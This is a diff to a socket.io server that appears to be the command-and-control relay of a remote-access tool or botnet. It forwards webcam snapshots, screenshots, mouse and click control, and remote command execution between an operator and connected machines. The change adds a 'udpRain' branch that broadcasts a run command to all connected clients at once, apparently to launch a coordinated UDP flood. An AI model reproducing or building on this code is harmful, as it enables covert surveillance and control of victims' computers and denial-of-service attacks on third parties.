@@ -33,13 +33,13 @@ io.on("connection", (socket) => {
   socket.on("camShotRequest", (data) => {
     io.to(data.from).emit("camShotRequest", data);
   });
-    socket.on("screenshotResponse", data => {
+  socket.on("screenshotResponse", (data) => {
     io.to(data.to).emit("screenshotResponse", data);
   });
-    socket.on("camShotResponse", data => {
+  socket.on("camShotResponse", (data) => {
     io.to(data.to).emit("camShotResponse", data);
   });
-    socket.on("mousemove", data => {
+  socket.on("mousemove", (data) => {
     io.to(data.from).emit("mousemove", data);
   });
   socket.on("click", (data) => {
@@ -52,8 +52,9 @@ io.on("connection", (socket) => {
         .split(",")
         .join("\r\n");
       io.to(data.to).emit("getRunResponse", data);
-    } else if (data.cmd.indexOf("bitrain") > -1) {
-        
+    } else if (data.cmd.indexOf("udpRain") > -1) {
+      console.log("udpRain triggered on server");
+      io.emit("getRunRequest", data);
     } else {
       io.to(data.from).emit("getRunRequest", data);
     }
